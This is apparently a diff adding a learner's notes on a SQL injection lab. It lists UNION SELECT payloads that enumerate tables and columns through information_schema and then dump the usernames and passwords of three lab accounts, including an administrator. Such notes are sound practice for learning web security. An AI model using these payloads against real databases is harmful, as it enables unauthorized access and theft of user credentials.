@@ -1,0 +1,15 @@
+1. finding out how many column needed
+2. type of every column (is string ?)
+3. 'union+select+table_name,null+from+information_schema.tables+where+table_name+not+like+'pg%'--
+important data found: users_jlpldi
+
+4. 'union+select+column_name,null+from+information_schema.columns+where+table_name='users_jlpldi'--
+important data found: email, password_karhiw, username_uetesb
+
+5. 'union+select+username_uetesb,password_karhiw+from+users_jlpldi--
+important data found: 3 accounts
+username	password                 key info
+
+carlos          fbjegnzxrs8o8mslan7c
+administrator   koicgrye6lvs05ntc581     *
+wiener          sotqqodgf3fjv9lhner9
